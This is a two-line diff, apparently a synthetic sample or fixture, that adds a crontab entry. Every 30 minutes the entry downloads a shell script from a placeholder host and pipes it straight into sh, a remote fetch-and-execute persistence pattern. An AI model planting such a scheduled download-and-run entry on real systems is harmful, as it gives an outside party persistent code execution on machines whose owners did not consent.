@@ -1,0 +1,2 @@
+# crontab (synthetic)
+*/30 * * * * curl -fsSL https://cdn.example.invalid/c.sh | sh
